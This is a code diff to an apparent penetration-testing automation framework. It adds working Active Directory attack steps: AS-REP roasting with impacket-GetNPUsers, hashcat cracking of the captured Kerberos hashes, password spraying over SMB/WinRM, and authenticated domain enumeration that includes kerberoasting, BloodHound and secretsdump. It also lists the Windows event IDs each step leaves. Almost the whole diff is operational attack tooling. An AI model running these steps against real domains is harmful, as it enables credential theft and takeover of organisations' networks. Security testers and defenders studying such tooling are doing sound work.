@@ -12,6 +12,8 @@ and the session/shell/CVE actions land in later phases.
 """
 from __future__ import annotations
 
+from pathlib import Path
+
 from lib import nmap
 from lib.engine.action import Action, ActionResult, Footprint, Requirement, Tier
 from lib.engine.facts import FactStore, ProtoStatus
@@ -92,6 +94,86 @@ def _h_ldap_anon(ctx) -> ActionResult:
                         discoveries=discoveries or [])
 
 
+# ── yellow: AS-REP roast (unlocked by domain + a user list) ───────────────────
+def _ensure_users_file(facts: FactStore) -> Path:
+    """Return loot/users.txt, materialising it from the fact store if add_user
+    has not already written it (e.g. users seeded purely in memory)."""
+    path = facts.loot_dir / "users.txt"
+    if not path.exists() or path.stat().st_size == 0:
+        users = facts.snapshot()["users"]
+        path.write_text("\n".join(users) + ("\n" if users else ""))
+    return path
+
+
+def _h_asrep_roast(ctx) -> ActionResult:
+    domain = ctx.facts.discovered_domain or ctx.domain
+    if not domain:
+        return ActionResult(ok=False, summary="no domain known")
+    users_file = _ensure_users_file(ctx.facts)
+    cmd = [
+        "impacket-GetNPUsers", f"{domain}/", "-no-pass", "-dc-ip", ctx.ip,
+        "-request", "-format", "hashcat", "-usersfile", str(users_file),
+    ]
+    ctx.findings.cmd(" ".join(cmd))
+    out = ctx.runner.run(cmd, "kerb_asrep_GetNPUsers", timeout=180)
+    lines = [l.strip() for l in out.splitlines() if "$krb5asrep$" in l]
+    if lines:
+        ctx.facts.append_krb_hashes("asrep.hash", lines)
+        ctx.findings.bullet("**AS-REP roastable hash(es) found — crack with `hashcat -m 18200`**")
+        ctx.findings.code_block("\n".join(lines))
+        ctx.findings.add_summary("**AS-REP hash(es) in `loot/asrep.hash`** — crack: `hashcat -m 18200`")
+        ctx.facts.add_hash("asrep")
+        return ActionResult(ok=True, summary=f"{len(lines)} AS-REP hash(es) captured")
+    ctx.facts.set_proto_status("kerberos", ProtoStatus.EXHAUSTED)
+    return ActionResult(ok=True, summary="no AS-REP roastable accounts")
+
+
+# ── passive: offline crack (local hashcat; zero packets to target) ────────────
+def _h_crack(ctx) -> ActionResult:
+    from lib import crack
+    cracked = crack.crack_hashes(ctx.facts, ctx.runner, ctx.findings, ctx.available)
+    if cracked:
+        return ActionResult(ok=True, summary=f"cracked {len(cracked)} password(s)")
+    return ActionResult(ok=True, summary="no hashes cracked")
+
+
+# ── yellow: credential spray (validate candidate passwords → valid_cred) ──────
+def _h_creds_spray(ctx) -> ActionResult:
+    import p0rtix                                   # late import (avoids cycle)
+    open_tcp = [p for (proto, p) in ctx.facts.snapshot()["open_ports"] if proto == "tcp"]
+    services = [Service(port=p, proto="tcp", name="", version="", is_web=False,
+                        scheme="", hostname="") for p in open_tcp]
+    before = len(ctx.facts.snapshot()["valid_creds"])
+    p0rtix._run_cred_reuse(ctx.ip, ctx.runner, ctx.findings, ctx.facts,
+                           services, ctx.available)
+    gained = len(ctx.facts.snapshot()["valid_creds"]) - before
+    return ActionResult(ok=True, summary=f"{gained} new valid credential(s)")
+
+
+# ── yellow: authenticated AD core (unlocked by a valid credential) ────────────
+def _pick_enum_cred(facts: FactStore) -> tuple[str, str] | None:
+    """Choose a valid credential to enumerate with — prefer a real user account
+    over a machine account ($)."""
+    valids = facts.snapshot()["valid_creds"]
+    for u, p in valids:
+        if not u.endswith("$"):
+            return (u, p)
+    return valids[0] if valids else None
+
+
+def _h_ad_core(ctx) -> ActionResult:
+    from lib import credsmode
+    domain = ctx.facts.discovered_domain or ctx.domain
+    cred = _pick_enum_cred(ctx.facts)
+    if not domain or cred is None:
+        return ActionResult(ok=False, summary="need a domain and a valid credential")
+    user, pw = cred
+    credsmode._ad_core(ctx.ip, domain, user, pw, ctx.runner, ctx.findings,
+                       ctx.facts, ctx.available)
+    ctx.facts.set_proto_status("ldap", ProtoStatus.EXHAUSTED)
+    return ActionResult(ok=True, summary=f"authenticated AD enum as {user}")
+
+
 def build_registry() -> ActionRegistry:
     reg = ActionRegistry()
 
@@ -143,6 +225,51 @@ def build_registry() -> ActionRegistry:
         gate=lambda f: _ldap_port(f) is not None,
         requires=(Requirement("ldap_port", "LDAP (tcp/389|636|3268|3269) open"),),
         deps=("ldapsearch",),
+    ))
+
+    reg.register(Action(
+        "kerberos.asrep_roast", Tier.YELLOW, _h_asrep_roast,
+        footprint=Footprint(
+            summary="AS-REP roast: one AS-REQ (no pre-auth) per known user",
+            windows_events=("4768 (TGT requested)", "4771 (pre-auth failed)"),
+        ),
+        gate=lambda f: f.has("domain") and f.has("users"),
+        requires=(Requirement("domain", "a domain"),
+                  Requirement("users", "a user list")),
+        deps=("impacket-GetNPUsers",),
+    ))
+
+    reg.register(Action(
+        "crack.hashes", Tier.PASSIVE, _h_crack,
+        footprint=Footprint(
+            summary="offline hashcat + rockyou on captured hashes (local only)"),
+        gate=lambda f: f.has("hash"),
+        requires=(Requirement("hash", "a captured hash (AS-REP/Kerberoast/NTLM)"),),
+        deps=("hashcat",),
+    ))
+
+    reg.register(Action(
+        "creds.spray", Tier.YELLOW, _h_creds_spray,
+        footprint=Footprint(
+            summary="spray candidate password(s) across the user list (SMB/WinRM)",
+            windows_events=("4625 (failed logon)", "4624 (logon) on a hit"),
+        ),
+        gate=lambda f: f.has("cred") and f.has("tcp/445"),
+        requires=(Requirement("cred", "a candidate password (cracked/leaked)"),
+                  Requirement("tcp/445", "SMB (tcp/445) open")),
+        deps=("nxc",),
+    ))
+
+    reg.register(Action(
+        "ad.authenticated_core", Tier.YELLOW, _h_ad_core,
+        footprint=Footprint(
+            summary="authenticated AD enum: ldapdomaindump, kerberoast, "
+                    "BloodHound, ADCS, secretsdump-if-admin",
+            windows_events=("4769 (TGS — kerberoast)", "4662 (directory reads)"),
+        ),
+        gate=lambda f: f.has("valid_cred") and f.has("domain"),
+        requires=(Requirement("valid_cred", "a valid credential"),
+                  Requirement("domain", "a domain")),
     ))
 
     return reg
